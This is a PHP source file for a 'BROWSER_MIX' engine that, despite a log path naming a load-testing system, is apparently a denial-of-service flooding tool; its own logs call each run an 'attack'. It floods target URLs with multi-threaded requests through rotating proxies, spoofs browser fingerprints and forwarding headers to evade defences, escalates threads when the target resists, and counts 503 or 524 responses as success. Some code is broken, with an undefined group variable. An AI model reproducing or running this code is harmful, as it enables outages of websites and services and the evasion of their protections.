<?php

require_once '../database.php';
require_once '../stealth_engine.php';
require_once '../client_profile.php';
require_once '../tls_profile.php';
require_once '../proxy_manager.php';

class BrowserMixEngine {
    private $db;
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    private $browserProfiles;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
        $this->clientProfile = new ClientProfile();
        $this->tlsProfile = new TLSProfile();
        $this->proxyManager = new ProxyManager();
        $this->browserProfiles = $this->initializeBrowserProfiles();
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'BROWSER_MIX',
            'threads' => 80,
            'duration' => 350,
            'request_rate' => 100,
            'browser_rotation' => true,
            'mixed_patterns' => true,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'header_spoofing' => true,
            'fingerprint_mixing' => true,
            'behavior_randomization' => true,
            'session_simulation' => true,
            'cookie_management' => true,
            'cache_simulation' => true,
            'escalation_factor' => 1.3,
            'resistance_threshold' => 0.6
        ];
    }
    
    public function start($targets, $stealthSessionId = null) {
        $this->logMessage("Starting BROWSER_MIX attack on " . count($targets) . " targets");
        
        if ($this->config['stealth_enabled'] && $stealthSessionId) {
            $this->stealthEngine = new StealthEngine();
            $this->stealthEngine->loadSession($stealthSessionId);
        }
        
        $results = [];
        $startTime = time();
        
        foreach ($targets as $target) {
            $results[$target] = $this->executeBrowserMixAttack($target, $startTime);
        }
        
        return [
            'status' => 'completed',
            'method' => 'BROWSER_MIX',
            'targets' => count($targets),
            'results' => $results,
            'total_requests' => array_sum(array_column($results, 'total_requests')),
            'browser_sessions' => array_sum(array_column($results, 'browser_sessions')),
            'mixed_patterns' => array_sum(array_column($results, 'mixed_patterns'))
        ];
    }
    
    private function executeBrowserMixAttack($target, $startTime) {
        $this->logMessage("Executing BROWSER_MIX attack on $target");
        
        $totalRequests = 0;
        $browserSessions = 0;
        $mixedPatterns = 0;
        $successCount = 0;
        $errorCodes = [];
        $currentThreads = $this->config['threads'];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                $browserProfile = $this->selectBrowserProfile();
                $sessionResult = $this->simulateBrowserSession($target, $browserProfile);
                $totalRequests += $sessionResult['requests'];
                $browserSessions++;
                $mixedPatterns += $sessionResult['patterns_used'];
                
                if ($sessionResult['success']) {
                    $successCount++;
                } else {
                    $errorCodes[] = $sessionResult['status_code'];
                }
                
                if ($this->config['stealth_enabled'] && $totalRequests % 25 === 0) {
                    $this->rotateStealthComponents();
                }
                
                usleep(rand(100000, 600000));
            }
            
            if ($this->shouldEscalate($errorCodes, $totalRequests)) {
                $currentThreads = $currentThreads * $this->config['escalation_factor'];
                $this->logMessage("Escalated threads to $currentThreads for $target");
            }
            
            if ($totalRequests % 50 === 0) {
                $this->logProgress($target, $totalRequests, $browserSessions, $mixedPatterns);
            }
        }
        
        return [
            'target' => $target,
            'total_requests' => $totalRequests,
            'browser_sessions' => $browserSessions,
            'mixed_patterns' => $mixedPatterns,
            'success_count' => $successCount,
            'success_rate' => $totalRequests > 0 ? $successCount / $totalRequests : 0,
            'error_codes' => array_count_values($errorCodes),
            'final_threads' => $currentThreads
        ];
    }
    
    private function initializeBrowserProfiles() {
        return [
            'chrome_desktop' => [
                'name' => 'Chrome Desktop',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept_language' => 'en-US,en;q=0.9',
                'accept_encoding' => 'gzip, deflate, br',
                'sec_fetch_dest' => 'document',
                'sec_fetch_mode' => 'navigate',
                'sec_fetch_site' => 'none',
                'sec_fetch_user' => '?1',
                'cache_control' => 'max-age=0',
                'patterns' => ['standard_browsing', 'tab_switching', 'bookmark_access']
            ],
            'firefox_desktop' => [
                'name' => 'Firefox Desktop',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept_language' => 'en-US,en;q=0.5',
                'accept_encoding' => 'gzip, deflate, br',
                'dnt' => '1',
                'connection' => 'keep-alive',
                'upgrade_insecure_requests' => '1',
                'patterns' => ['privacy_browsing', 'addon_requests', 'developer_tools']
            ],
            'safari_desktop' => [
                'name' => 'Safari Desktop',
                'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept_language' => 'en-US,en;q=0.9',
                'accept_encoding' => 'gzip, deflate, br',
                'connection' => 'keep-alive',
                'patterns' => ['webkit_specific', 'apple_services', 'icloud_sync']
            ],
            'chrome_mobile' => [
                'name' => 'Chrome Mobile',
                'user_agent' => 'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept_language' => 'en-US,en;q=0.9',
                'accept_encoding' => 'gzip, deflate, br',
                'sec_ch_ua_mobile' => '?1',
                'sec_ch_ua_platform' => '"Android"',
                'patterns' => ['mobile_browsing', 'touch_events', 'orientation_change']
            ],
            'edge_desktop' => [
                'name' => 'Edge Desktop',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept_language' => 'en-US,en;q=0.9',
                'accept_encoding' => 'gzip, deflate, br',
                'sec_fetch_dest' => 'document',
                'sec_fetch_mode' => 'navigate',
                'sec_fetch_site' => 'none',
                'patterns' => ['edge_specific', 'cortana_integration', 'microsoft_services']
            ]
        ];
    }
    
    private function selectBrowserProfile() {
        $profiles = array_keys($this->browserProfiles);
        $selectedProfile = $profiles[array_rand($profiles)];
        return $this->browserProfiles[$selectedProfile];
    }
    
    private function simulateBrowserSession($target, $browserProfile) {
        $headers = $this->buildBrowserHeaders($browserProfile);
        $proxy = $this->config['proxy_rotation'] ? $this->proxyManager->getActiveProxy() : null;
        $requests = 0;
        $patternsUsed = 0;
        
        $sessionSteps = $this->generateSessionSteps($browserProfile);
        
        foreach ($sessionSteps as $step) {
            $stepResult = $this->executeBrowserStep($target, $step, $headers, $proxy, $browserProfile);
            $requests += $stepResult['requests'];
            $patternsUsed += $stepResult['patterns'];
            
            if (!$stepResult['success']) {
                return [
                    'success' => false,
                    'status_code' => $stepResult['status_code'],
                    'requests' => $requests,
                    'patterns_used' => $patternsUsed,
                    'browser' => $browserProfile['name']
                ];
            }
            
            if ($this->config['behavior_randomization']) {
                usleep(rand(200000, 1500000));
            }
        }
        
        return [
            'success' => true,
            'status_code' => 200,
            'requests' => $requests,
            'patterns_used' => $patternsUsed,
            'browser' => $browserProfile['name']
        ];
    }
    
    private function generateSessionSteps($browserProfile) {
        $baseSteps = ['initial_load', 'resource_fetch', 'interaction'];
        $patternSteps = $browserProfile['patterns'];
        
        $allSteps = array_merge($baseSteps, $patternSteps);
        shuffle($allSteps);
        
        return array_slice($allSteps, 0, rand(3, 6));
    }
    
    private function executeBrowserStep($target, $step, $headers, $proxy, $browserProfile) {
        $requests = 0;
        $patterns = 0;
        
        switch ($step) {
            case 'initial_load':
                $requests += $this->performInitialLoad($target, $headers, $proxy);
                $patterns++;
                break;
                
            case 'resource_fetch':
                $requests += $this->performResourceFetch($target, $headers, $proxy, $browserProfile);
                $patterns++;
                break;
                
            case 'interaction':
                $requests += $this->performUserInteraction($target, $headers, $proxy, $browserProfile);
                $patterns++;
                break;
                
            case 'standard_browsing':
                $requests += $this->simulateStandardBrowsing($target, $headers, $proxy);
                $patterns++;
                break;
                
            case 'tab_switching':
                $requests += $this->simulateTabSwitching($target, $headers, $proxy);
                $patterns++;
                break;
                
            case 'privacy_browsing':
                $requests += $this->simulatePrivacyBrowsing($target, $headers, $proxy);
                $patterns++;
                break;
                
            case 'mobile_browsing':
                $requests += $this->simulateMobileBrowsing($target, $headers, $proxy);
                $patterns++;
                break;
                
            default:
                $requests += $this->performGenericRequest($target, $headers, $proxy);
                $patterns++;
                break;
        }
        
        return [
            'success' => true,
            'status_code' => 200,
            'requests' => $requests,
            'patterns' => $patterns
        ];
    }
    
    private function performInitialLoad($target, $headers, $proxy) {
        $this->makeBrowserRequest($target, $headers, $proxy);
        return 1;
    }
    
    private function performResourceFetch($target, $headers, $proxy, $browserProfile) {
        $requests = 0;
        
        $resourceTypes = ['css', 'js', 'images', 'fonts'];
        foreach ($resourceTypes as $type) {
            $resourceHeaders = array_merge($headers, [
                'Accept: ' . $this->getResourceAcceptHeader($type),
                'Referer: ' . $target,
                'Sec-Fetch-Dest: ' . $type
            ]);
            
            $this->makeBrowserRequest($target, $resourceHeaders, $proxy);
            $requests++;
        }
        
        return $requests;
    }
    
    private function performUserInteraction($target, $headers, $proxy, $browserProfile) {
        $interactionHeaders = array_merge($headers, [
            'X-Requested-With: XMLHttpRequest',
            'Content-Type: application/json',
            'Referer: ' . $target
        ]);
        
        $this->makeBrowserRequest($target, $interactionHeaders, $proxy);
        return 1;
    }
    
    private function simulateStandardBrowsing($target, $headers, $proxy) {
        $browsingHeaders = array_merge($headers, [
            'Cache-Control: max-age=0',
            'Sec-Fetch-User: ?1'
        ]);
        
        $this->makeBrowserRequest($target, $browsingHeaders, $proxy);
        return 1;
    }
    
    private function simulateTabSwitching($target, $headers, $proxy) {
        $tabHeaders = array_merge($headers, [
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin'
        ]);
        
        $this->makeBrowserRequest($target, $tabHeaders, $proxy);
        return 1;
    }
    
    private function simulatePrivacyBrowsing($target, $headers, $proxy) {
        $privacyHeaders = array_merge($headers, [
            'DNT: 1',
            'Sec-GPC: 1',
            'Cache-Control: no-cache'
        ]);
        
        $this->makeBrowserRequest($target, $privacyHeaders, $proxy);
        return 1;
    }
    
    private function simulateMobileBrowsing($target, $headers, $proxy) {
        $mobileHeaders = array_merge($headers, [
            'Sec-CH-UA-Mobile: ?1',
            'Viewport-Width: 393',
            'Device-Memory: 8'
        ]);
        
        $this->makeBrowserRequest($target, $mobileHeaders, $proxy);
        return 1;
    }
    
    private function performGenericRequest($target, $headers, $proxy) {
        $this->makeBrowserRequest($target, $headers, $proxy);
        return 1;
    }
    
    private function makeBrowserRequest($target, $headers, $proxy) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $target,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_COOKIEJAR => '/tmp/browser_cookies_' . uniqid() . '.txt',
            CURLOPT_COOKIEFILE => '/tmp/browser_cookies_' . uniqid() . '.txt'
        ]);
        
        if ($proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
            if (isset($proxy['auth'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['auth']);
            }
        }
        
        $response = curl_exec($ch);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'success' => $response !== false && $statusCode >= 200 && $statusCode < 400,
            'status_code' => $statusCode,
            'response_size' => strlen($response ?: '')
        ];
    }
    
    private function buildBrowserHeaders($browserProfile) {
        $headers = [
            'User-Agent: ' . $browserProfile['user_agent'],
            'Accept: ' . $browserProfile['accept'],
            'Accept-Language: ' . $browserProfile['accept_language'],
            'Accept-Encoding: ' . $browserProfile['accept_encoding']
        ];
        
        if (isset($browserProfile['sec_fetch_dest'])) {
            $headers[] = 'Sec-Fetch-Dest: ' . $browserProfile['sec_fetch_dest'];
        }
        if (isset($browserProfile['sec_fetch_mode'])) {
            $headers[] = 'Sec-Fetch-Mode: ' . $browserProfile['sec_fetch_mode'];
        }
        if (isset($browserProfile['sec_fetch_site'])) {
            $headers[] = 'Sec-Fetch-Site: ' . $browserProfile['sec_fetch_site'];
        }
        if (isset($browserProfile['dnt'])) {
            $headers[] = 'DNT: ' . $browserProfile['dnt'];
        }
        if (isset($browserProfile['connection'])) {
            $headers[] = 'Connection: ' . $browserProfile['connection'];
        }
        
        if ($this->config['header_spoofing']) {
            $headers[] = 'X-Forwarded-For: ' . $this->generateRandomIP();
            $headers[] = 'X-Real-IP: ' . $this->generateRandomIP();
            $headers[] = 'X-Browser-Profile: ' . $browserProfile['name'];
        }
        
        return $headers;
    }
    
    private function getResourceAcceptHeader($type) {
        switch ($type) {
            case 'css':
                return 'text/css,*/*;q=0.1';
            case 'js':
                return '*/*';
            case 'images':
                return 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8';
            case 'fonts':
                return 'font/woff2,font/woff,font/ttf,*/*;q=0.1';
            default:
                return '*/*';
        }
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldEscalate($errorCodes, $requestCount) {
        if ($requestCount < 25) return false;
        
        $recentErrors = array_slice($errorCodes, -12);
        $errorRate = count($recentErrors) / min(12, $requestCount);
        
        return $errorRate > $this->config['resistance_threshold'];
    }
    
    private function logProgress($target, $requests, $sessions, $patterns) {
        $this->logMessage("BROWSER_MIX Progress - Target: $target, Requests: $requests, Sessions: $sessions, Patterns: $patterns");
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = '/home/ftcceelg/load_testing_system/logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] BROWSER_MIX_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>
